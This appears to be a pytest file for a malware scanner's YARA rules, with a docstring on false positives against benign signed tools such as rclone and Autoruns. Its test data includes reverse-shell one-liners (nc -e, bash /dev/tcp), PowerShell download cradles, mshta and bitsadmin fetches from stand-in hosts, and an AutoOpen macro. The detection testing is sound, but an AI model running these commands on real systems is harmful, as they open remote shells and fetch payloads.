"""Two common strings far apart are two coincidences, not a finding.

Seventeen ordinary zip archives of well-known signed software — Process
Explorer, Process Monitor, Autoruns, ripgrep, fd, rclone, syncthing, upx,
Windows Terminal — came back `suspicious` or `malicious`. Every one of them on
`archive.malicious_member`.

The container rule turned out to be RIGHT and is deliberately not changed here.
`pipeline.py:634` floors a container at its worst member's score because two
layers of zipping otherwise took a 68-point dropper down to 1.7, and three
independent reviews of "only inherit when the member FOUND something" were all
broken by the same attack: Amadey's real delivery shape is a single PE in a zip,
and the fixture detects it at 60.5 on `Win32.Malware.StaticPeAnomaly` —
structural evidence. Any rule that demands a "finding" lets Amadey-in-a-zip
through.

The archives were reporting their members faithfully. The members were wrong,
and they were wrong for one reason, five times:

    rule                           matched                             apart
    ---------------------------------------------------------------------------
    LOLBin_Mshta_Remote_Script     `MSHTA.EXE` in Autoruns' own table    58,886 B
                                   of autostart hosts, and the `http`
                                   of https://www.sysinternals.com
    Reverse_Shell_OneLiner         `nc -e` inside "bisy-nc- -case" in         0 B
                                   rclone's README, .txt and man page
    VBA_AutoExec_And_Shell         `AutoClose` (Go's encoding/xml) and   47,545 B
                                   `Shell` (shellComplete) in a Go binary
    PowerShell_Download_Cradle     `DownloadFile` (Azure SDK symbol) and  8.28 MB
                                   `Invoke-Expression` (rclone's own
                                   shell-completion help text)
    PE_Keylogger_Api_Combo         API names anywhere in the file, by a
                                   rule whose own description says
                                   "PE imports"

Measured. Across the 88-sample detonation fixture, four of those five rules
catch ZERO malware and accused fourteen benign files between them. Across every
real malware sample on the detonation host (121 files) the pack went from
matching 14 files to matching 11; all three differences were the same
coincidence in reverse — `DownloadString` sitting in a .NET metadata string heap
between `MeasureString` and `DrawString`, with a bare three-byte `IEX` 38 KB
away in obfuscated identifier soup. All three samples are still `malicious` at
62.8, 66.5 and 49.5 on 21-26 non-YARA high-severity signals each; one of them
the sandbox names outright as DCRat.

Nothing is deleted. An out-of-scope match is still reported, at `info`, saying
why it does not count — the same treatment `AMBIENT_SIGNALS` gives a sandbox
signature that describes the guest rather than the sample.
"""
from __future__ import annotations

import glob
import hashlib
import os

import pytest

from app.engine import yara_engine
from app.engine.contracts import Sample

pytest.importorskip("yara")


@pytest.fixture(scope="module")
def rules():
    import yara

    here = os.path.join(os.path.dirname(os.path.abspath(yara_engine.__file__)), "rules")
    paths = glob.glob(os.path.join(here, "*.yar"))
    assert paths, here
    return yara.compile(filepaths={os.path.basename(p): p for p in paths})


def fired(rules, rule: str, payload: bytes) -> bool:
    return any(m.rule == rule for m in rules.match(data=payload))


# --- the five accusations, each still caught when it is real -----------------

REAL = [
    ("LOLBin_Mshta_Remote_Script", b"cmd /c mshta http://evil.example/a.hta"),
    ("LOLBin_Mshta_Remote_Script", b'mshta javascript:GetObject("script:http://x/y.sct")'),
    ("LOLBin_Mshta_Remote_Script", b"mshta vbscript:Execute(\"x\")"),
    ("LOLBin_Mshta_Remote_Script", "mshta http://evil/a.hta".encode("utf-16le")),
    ("LOLBin_Mshta_Remote_Script", b"http://evil.example/a.hta was fetched by mshta"),
    ("Bitsadmin_Transfer_Download", b"bitsadmin /transfer j http://evil.example/p.exe C:\\p.exe"),
    ("Bitsadmin_Transfer_Download", "bitsadmin /transfer j http://e/p.exe".encode("utf-16le")),
    ("Reverse_Shell_OneLiner", b"nc -e /bin/sh 10.0.0.1 4444"),
    ("Reverse_Shell_OneLiner", b"nc.traditional -e /bin/bash 1.2.3.4 9001"),
    ("Reverse_Shell_OneLiner", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ("PowerShell_Download_Cradle", b"IEX (New-Object Net.WebClient).DownloadString('http://e/s')"),
    ("PowerShell_Download_Cradle", b"Invoke-Expression (Invoke-WebRequest -Uri http://e/s)"),
    ("PowerShell_Download_Cradle",
     "IEX(New-Object Net.WebClient).DownloadString('http://e/a')".encode("utf-16le")),
    ("VBA_AutoExec_And_Shell", b'Sub AutoOpen()\n  Shell "cmd /c calc"\nEnd Sub'),
    ("VBA_AutoExec_And_Shell",
     b'Private Sub Document_Open()\nCreateObject("WScript.Shell").Run x\nEnd Sub'),
]

#: The exact shapes measured on the real benign files, reproduced.
COINCIDENCE = [
    ("LOLBin_Mshta_Remote_Script",
     "Autoruns' autostart-host table, and its own homepage 58 KB away",
     b"\\SHELL.EXE\\PWSH.EXE\\MSHTA.EXE\\PCALUA.EXE"
     + b"\x00" * 58000 + b"https://www.sysinternals.com"),
    ("Bitsadmin_Transfer_Download",
     "the three words present but nowhere near each other",
     b"bitsadmin" + b"x" * 5000 + b"/transfer" + b"x" * 5000 + b"http://a"),
    ("Reverse_Shell_OneLiner",
     "rclone's README: the nc is the tail of bisync, -case satisfies -[a-z]*e",
     b"For example, go test ./cmd/bisync -case dry-run -remote gdrive: -remote2 local"),
    ("Reverse_Shell_OneLiner",
     "rclone's man page, same shape",
     b"run the whole test suite go test ./cmd/bisync -remote local"),
    ("PowerShell_Download_Cradle",
     "a .NET metadata string heap, and a bare IEX 38 KB away",
     b"ToBase64String DownloadString MeasureString GetString DrawString Substring"
     + b"q" * 38000 + b"vIEXm"),
    ("PowerShell_Download_Cradle",
     "rclone: an Azure SDK symbol and its own completion help, megabytes apart",
     b"downloadFileToWriterAt" + b"z" * 800000 + b"completion powershell | Out-String | Invoke-Expression"),
]


@pytest.mark.parametrize("rule,payload", REAL, ids=[f"{r}-{i}" for i, (r, _p) in enumerate(REAL)])
def test_the_real_thing_is_still_caught(rules, rule, payload) -> None:
    assert fired(rules, rule, payload)


@pytest.mark.parametrize(
    "rule,why,payload", COINCIDENCE,
    ids=[f"{r}-{i}" for i, (r, _w, _p) in enumerate(COINCIDENCE)])
def test_a_coincidence_is_not_a_finding(rules, rule, why, payload) -> None:
    assert not fired(rules, rule, payload), why


# --- a rule may say which formats it is not about ----------------------------


def _sample(tmp_path, name: str, payload: bytes, family: str) -> Sample:
    path = tmp_path / name
    path.write_bytes(payload)
    return Sample(
        path=str(path), size_bytes=len(payload),
        sha256=hashlib.sha256(payload).hexdigest(),
        md5=hashlib.md5(payload).hexdigest(),
        mime="application/x-dosexec", magic="PE32",
        claimed_extension=os.path.splitext(name)[1], original_name=name,
        family=family,
    )


#: A Go binary's symbol table: `autoClose` from encoding/xml and `shellComplete`
#: from the CLI library. This is syncthing.exe and rclone.exe in miniature.
GO_SYMBOLS = (
    b"MZ\x90\x00" + b"\x00" * 60
    + b"*xml.Name AutoClose needClose nextToken linestart *xml.Attr autoClose"
    + b"\x00" * 2000
    + b"*cli.IntSlice *func() []int shellComplete parentContext GlobalFloat64"
)


def test_a_go_binary_has_no_vba_project(tmp_path) -> None:
    result = yara_engine.analyze(_sample(tmp_path, "syncthing.exe", GO_SYMBOLS, "pe"))
    macro = [s for s in result.signals if s.id == "yara.vba_autoexec_and_shell"]
    assert macro, "the rule should still MATCH — the point is that it may not accuse"
    assert macro[0].severity == "info", macro[0].to_dict()
    assert macro[0].evidence.get("out_of_scope_for") == "pe"


def test_the_same_bytes_in_a_document_still_accuse(tmp_path) -> None:
    """The exclusion is by FAMILY, which identify.py derives from content — so it
    cannot be reached by renaming a file."""
    macro = b'Sub AutoOpen()\n  Shell "cmd /c calc"\nEnd Sub'
    result = yara_engine.analyze(_sample(tmp_path, "invoice.doc", macro, "office"))
    hits = [s for s in result.signals if s.id == "yara.vba_autoexec_and_shell"]
    assert hits, [s.id for s in result.signals]
    assert hits[0].severity == "high", hits[0].to_dict()


def test_a_rule_without_a_declared_scope_still_runs_everywhere(tmp_path) -> None:
    """The default is unchanged: an embedded-PE rule firing on a "text" file is
    the contradiction this analyzer exists to surface."""
    payload = b"a text file that carries " + b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 600
    result = yara_engine.analyze(_sample(tmp_path, "notes.txt", payload, "script"))
    assert not any(s.evidence.get("out_of_scope_for") for s in result.signals)


def test_the_keylogger_rule_asks_the_import_table(tmp_path) -> None:
    """Its description says "PE imports". A name in a data blob is not an import,
    and the rule now checks what it claims."""
    here = os.path.join(os.path.dirname(os.path.abspath(yara_engine.__file__)), "rules")
    with open(os.path.join(here, "capabilities.yar"), encoding="utf-8") as fh:
        body = fh.read()
    rule = body[body.index("rule PE_Keylogger_Api_Combo"):]
    rule = rule[: rule.index("\n}")]
    assert 'pe.imports("user32.dll", "SetWindowsHookExW")' in rule
    assert 'pe.imports("user32.dll", "GetAsyncKeyState")' in rule
    assert "uint16(0) == 0x5A4D" not in rule
